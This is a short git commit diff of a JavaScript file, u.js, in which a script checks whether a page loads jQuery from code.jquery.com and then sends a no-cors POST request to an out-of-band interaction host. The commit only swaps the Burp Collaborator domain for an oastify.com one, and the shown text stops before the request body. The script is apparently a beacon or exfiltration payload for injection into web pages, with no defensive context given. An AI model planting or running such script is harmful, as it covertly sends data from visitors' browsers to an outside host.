aa8ee3052468be45a0a46a6502aba29ef6c65434
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2022-12-03 19:15:14 +0330

    Update u.js

--- u.js
+++ u.js
@@ -1,6 +1,6 @@
 var reg=/code\.jquery.com/ig;
 if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
-fetch('https://8mvcheojaohdf3432jmgzibkgbm1aq.burpcollaborator.net', {
+fetch('https://8mvcheojaohdf3432jmgzibkgbm1aq.oastify.com', {
 method: 'POST',
 mode: 'no-cors',
 headers:{'content-type': 'application/x-www-form-urlencoded'},
